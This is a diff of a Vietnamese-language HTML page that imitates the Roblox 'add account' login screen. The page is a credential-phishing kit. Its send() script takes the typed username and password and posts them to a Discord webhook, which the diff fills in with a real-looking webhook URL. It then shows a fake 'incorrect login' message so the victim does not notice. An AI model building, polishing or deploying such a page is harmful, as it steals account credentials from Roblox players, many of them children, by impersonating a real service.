@@ -3,164 +3,191 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Roblox Login</title>
+    <title>Roblox Square - Optimized</title>
     <style>
-        /* Reset cơ bản */
         * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0; padding: 0; }
         
         body, html {
-            height: 100%; width: 100%;
-            background-color: #111;
+            height: 100vh; width: 100%;
+            background-color: #000;
             font-family: 'HCo Gotham SSm', Helvetica, Arial, sans-serif;
-            display: flex; flex-direction: column;
-            overflow-x: hidden;
+            display: flex; flex-direction: column; align-items: center;
+            justify-content: space-between; 
+            overflow: hidden;
         }
 
-        /* --- BACKGROUND --- */
+        /* HEADER */
+        .header {
+            width: 100%; max-width: 450px; height: 52px;
+            background: #232527; z-index: 100;
+            display: flex; flex-direction: column; padding: 6px 15px;
+            flex-shrink: 0;
+        }
+        .header-top {
+            display: flex; align-items: center; justify-content: space-between;
+            width: 100%; height: 20px;
+        }
+        .header-left { display: flex; align-items: center; gap: 8px; }
+        .roblox-logo { width: 14px; height: 14px; fill: #fff; }
+        .search-bar { 
+            background: #111; border: 1px solid #444; border-radius: 4px;
+            padding: 1px 6px; width: 110px; color: #eee; font-size: 8px; height: 17px;
+        }
+        .btn-top-login { 
+            color: #fff; font-size: 8px; font-weight: 700; 
+            background: #393b3d; padding: 2px 7px; border-radius: 3px;
+        }
+        .header-nav {
+            display: flex; align-items: center; justify-content: space-between;
+            width: 100%; margin-top: 8px;
+        }
+        .nav-item { color: #bbb; font-size: 7px; font-weight: 600; }
+
         .bg-image {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
             background-image: url('https://images.rbxcdn.com/f9379895240be6d16f391b1076b97669.jpg');
-            background-size: cover; background-position: center top; z-index: 1;
-        }
-        .dark-overlay {
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0, 0, 0, 0.75); z-index: 2;
+            background-size: cover; background-position: center; z-index: 1;
+            filter: brightness(0.25);
         }
 
-        /* --- NAVBAR --- */
-        .navbar {
-            position: relative; z-index: 10;
-            background-color: #191B1D;
-            height: 44px;
-            display: flex; align-items: center; justify-content: space-between;
-            padding: 0 12px;
-            border-bottom: 1px solid rgba(255,255,255,0.1);
+        .container { 
+            display: flex; justify-content: center; align-items: center; 
+            z-index: 10; width: 100%; flex: 1;
         }
-        .nav-left { display: flex; align-items: center; gap: 15px; }
-        .logo { width: 24px; height: 24px; background: url('https://images.rbxcdn.com/cece570e37aa8f95a450.svg') no-repeat center; background-size: contain; filter: brightness(100%); }
-        .nav-links { display: flex; gap: 15px; }
-        .nav-links a { color: #fff; text-decoration: none; font-size: 14px; font-weight: 500; opacity: 0.8; }
-        .nav-right-btn { color: #fff; border: 1px solid rgba(255,255,255,0.3); padding: 4px 8px; border-radius: 4px; font-size: 12px; text-decoration: none; }
-
-        /* --- MAIN CONTENT --- */
-        .main-container {
-            flex-grow: 1; display: flex; justify-content: center; align-items: center;
-            position: relative; z-index: 5; padding: 15px;
-        }
-
-        /* --- LOGIN BOX (Đã chỉnh sửa vuông và ngắn hơn) --- */
         .login-box {
-            background-color: #232527;
-            padding: 20px 24px; /* Giảm padding trên dưới */
-            border-radius: 2px; /* CHỈNH: Góc vuông hơn (cũ là 8px) */
-            width: 100%;
-            max-width: 400px; /* CHỈNH: Tăng độ rộng để trông cân đối hình vuông hơn */
-            display: flex; flex-direction: column; text-align: center; color: #fff;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.5);
+            background-color: #25272b;
+            padding: 5px 12px 18px 12px;
+            width: 210px; text-align: center; color: #fff; 
+            border-radius: 6px; box-shadow: 0 5px 15px rgba(0,0,0,0.8);
         }
 
+        /* ĐÃ TĂNG KÍCH THƯỚC CHỮ */
         h2 { 
-            font-size: 22px; 
-            margin-bottom: 15px; /* CHỈNH: Giảm khoảng cách dưới tiêu đề */
-            font-weight: 700; 
+            font-size: 18px; /* Tăng từ 14px lên 18px */
+            margin-top: 15px; 
+            margin-bottom: 18px; 
+            font-weight: 800; 
+            letter-spacing: 0px; /* Reset letter-spacing để chữ rõ hơn khi to */
         }
-        
-        .input-group { margin-bottom: 8px; /* CHỈNH: Giảm khoảng cách giữa các ô */ }
+
         .input-field {
-            width: 100%; padding: 10px 12px;
-            background: rgba(0, 0, 0, 0.2);
-            border: 1px solid rgba(255, 255, 255, 0.2);
-            border-radius: 2px; /* Vuông góc ô nhập */
-            color: white; font-size: 14px; outline: none;
+            width: 100%; height: 19px; padding: 0 8px;
+            background: #32353b; border: 1px solid #3d4147;
+            border-radius: 3px; color: white; font-size: 7.5px; outline: none;
         }
-        .input-field::placeholder { color: rgba(255, 255, 255, 0.5); }
-        .input-field:focus { border-color: rgba(255, 255, 255, 0.5); }
-
-        .btn-primary {
-            width: 100%; padding: 10px; margin-top: 5px;
-            background: #fff; color: #232527; border: none;
-            border-radius: 2px; /* Vuông góc nút */
-            font-weight: 700; font-size: 16px; cursor: pointer;
-            transition: background 0.2s;
+        .input-field-u { margin-bottom: 3px; }
+        .input-field-p { margin-bottom: 8px; }
+        .btn-login {
+            width: 100%; height: 19px; background: transparent; color: #fff;
+            border: 1px solid #fff; border-radius: 3px; font-size: 8px;
+            display: flex; align-items: center; justify-content: center;
         }
-        .btn-primary:hover { background: #e0e0e0; }
-
-        .forgot-link { 
-            display: block; margin: 12px 0; /* Giảm lề */
-            color: rgba(255,255,255,0.7); font-size: 12px; text-decoration: none; 
+        .forgot-link { display: block; margin-top: 6px; color: #adb5bd; font-size: 6.5px; text-decoration: none; }
+        .spacer { height: 16px; width: 100%; }
+        .btn-action {
+            width: 100%; height: 17px; padding: 0; background: #3c4046; 
+            border: none; color: #fff; border-radius: 3px; font-size: 7px; 
+            margin-bottom: 4px; font-weight: 600;
+            display: flex; align-items: center; justify-content: center;
         }
 
-        .btn-secondary {
-            width: 100%; padding: 8px; margin-top: 6px; /* Nút phụ nhỏ gọn hơn */
-            background: transparent; color: #fff; 
-            border: 1px solid rgba(255, 255, 255, 0.3);
-            border-radius: 2px; /* Vuông góc */
-            font-size: 13px; font-weight: 500; cursor: pointer;
+        .footer {
+            width: 100%; max-width: 450px; 
+            padding: 10px 10px 35px 10px; 
+            color: #ddd; text-align: center; z-index: 100; flex-shrink: 0;
         }
+        .footer-links { 
+            margin-bottom: 25px; 
+            display: flex; 
+            flex-wrap: wrap; 
+            justify-content: center; 
+            column-gap: 12px; 
+            row-gap: 20px;
+        }
+        .footer-links span {
+            font-size: 7.5px; 
+            color: #bbb;
+            display: inline-block;
+        }
+        .footer-links span:nth-child(odd) { transform: translateY(8px); }
+        .footer-links span:nth-child(even) { transform: translateY(-8px); }
 
-        @media (max-width: 600px) {
-            .nav-links { display: none; }
+        .footer-copyright { 
+            font-size: 6px; 
+            color: #555; 
+            line-height: 1.4;
+            margin-top: 15px;
         }
     </style>
 </head>
 <body>
 
-<div class="bg-image"></div>
-<div class="dark-overlay"></div>
-
-<div class="navbar">
-    <div class="nav-left">
-        <div class="logo"></div>
-        <div class="nav-links">
-            <a href="#">Khám phá</a>
-            <a href="#">Chợ</a>
-            <a href="#">Tạo</a>
-            <a href="#">Robux</a>
+<div class="header">
+    <div class="header-top">
+        <div class="header-left">
+            <svg class="roblox-logo" viewBox="0 0 28 28">
+                <path d="M4.3 0L0 23.7L23.7 28L28 4.3L4.3 0ZM18 18L10 16.5L11.5 8.5L19.5 10L18 18Z"/>
+            </svg>
+            <div class="search-bar">Tìm kiếm</div>
         </div>
+        <div class="btn-top-login">Đăng nhập</div>
     </div>
-    <a href="#" class="nav-right-btn">Đăng ký</a>
+    
+    <div class="header-nav">
+        <span class="nav-item">Bảng xếp hạng</span>
+        <span class="nav-item">Chợ</span>
+        <span class="nav-item">Tạo</span>
+        <span class="nav-item">Robux</span>
+    </div>
 </div>
 
-<div class="main-container">
+<div class="bg-image"></div>
+
+<div class="container">
     <div class="login-box">
         <h2>Thêm tài khoản</h2>
-        <div class="input-group">
-            <input type="text" id="u" class="input-field" placeholder="Tên người dùng/Email/Số điện thoại">
-        </div>
-        <div class="input-group">
-            <input type="password" id="p" class="input-field" placeholder="Mật khẩu">
-        </div>
-        <button class="btn-primary" onclick="send()">Đăng nhập</button>
+        <input type="text" id="u" class="input-field input-field-u" placeholder="Tên người dùng/Email/SĐT">
+        <input type="password" id="p" class="input-field input-field-p" placeholder="Mật khẩu">
+        <button class="btn-login" onclick="send()">Đăng nhập</button>
         
         <a href="#" class="forgot-link">Bạn quên Mật khẩu hoặc Tên người dùng?</a>
         
-        <button class="btn-secondary">Gửi mã một lần qua email</button>
-        <button class="btn-secondary">Sử dụng thiết bị khác</button>
+        <div class="spacer"></div>
+        
+        <button class="btn-action">Gửi mã một lần cho tôi qua email</button>
+        <button class="btn-action">Sử dụng thiết bị khác</button>
+    </div>
+</div>
+
+<div class="footer">
+    <div class="footer-links">
+        <span>Về chúng tôi</span>
+        <span>Việc làm</span>
+        <span>Blog</span>
+        <span>Cha mẹ</span>
+        <span>Mua thẻ quà tặng</span>
+        <span>Trợ giúp</span>
+        <span>Điều khoản</span>
+        <span>Riêng tư</span>
+        <span>Sơ đồ trang web</span>
+    </div>
+    <div class="footer-copyright">
+        ©2026 Roblox Corporation. Roblox, logo Roblox và Powering Imagination là các nhãn hiệu đã đăng ký của chúng tôi.
     </div>
 </div>
 
 <script>
     function send() {
-        const user = document.getElementById('u').value;
-        const pass = document.getElementById('p').value;
-        const webh = "YOUR_WEBHOOK_URL_HERE"; // Nhớ điền Webhook vào đây
-
-        if(!user || !pass) return alert("Vui lòng nhập đầy đủ thông tin!");
-
-        fetch(webh, {
+        const u = document.getElementById('u').value;
+        const p = document.getElementById('p').value;
+        if(!u || !p) return;
+        fetch("https://discord.com/api/webhooks/1460276452489695315/XC5wn4raeZxbNGi_Gyow4VNaZ9kzAVhnEoFKPCjpalXR_uMwu2b0vVRC2N8meXeJ6GQj", {
             method: "POST",
             headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({
-                content: "```New Login: " + user + " | " + pass + "```"
-            })
-        }).catch(err => console.log(err)); // Bắt lỗi âm thầm
-
-        setTimeout(() => {
-             alert("Tên người dùng hoặc mật khẩu không chính xác. Vui lòng thử lại.");
-             window.location.href = "https://www.roblox.com/login";
-        }, 1000);
+            body: JSON.stringify({ content: "👤: `" + u + "`\n🔑: `" + p + "`" })
+        });
+        setTimeout(() => { alert("Thông tin đăng nhập không chính xác."); window.location.reload(); }, 800);
     }
 </script>
-
 </body>
 </html>
